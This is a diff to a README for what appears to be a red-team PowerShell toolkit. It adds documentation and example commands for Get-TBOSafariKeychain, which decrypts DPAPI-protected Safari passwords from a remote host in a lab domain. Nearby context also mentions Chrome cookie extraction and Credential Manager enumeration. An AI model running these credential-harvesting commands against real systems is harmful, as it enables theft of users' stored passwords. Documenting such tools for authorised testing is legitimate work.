@@ -576,6 +576,21 @@ Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName '
   Select-Object HostKey, Name, Value, ExpiresUtc
 ```
 
+#### Get-TBOSafariKeychain
+
+Parses Safari for Windows `keychain.plist` files and decrypts DPAPI-protected password entries.
+Safari uses a fixed, application-specific DPAPI entropy value (same as dpapick's Safari probe), so the correct entropy is applied automatically.
+The Safari cleartext payload is length-prefixed; TBO extracts the length and then decodes the password bytes as text when possible.
+
+```powershell
+$userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
+Get-TBOSafariKeychain -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $userKeys
+Get-TBOSafariKeychain -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -MasterKeys $userKeys
+
+# Specify a keychain.plist path directly (UNC or tbo: drive path)
+Get-TBOSafariKeychain -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\corp1-web01.corp1.lab.home-labs.lol\C$\Users\jsmith\AppData\Roaming\Apple Computer\Safari\keychain.plist' -MasterKeys $userKeys
+```
+
 #### Get-TBOCredManFiles
 
 Enumerates Credential Manager files (Credentials and Vaults) for user and system profiles.
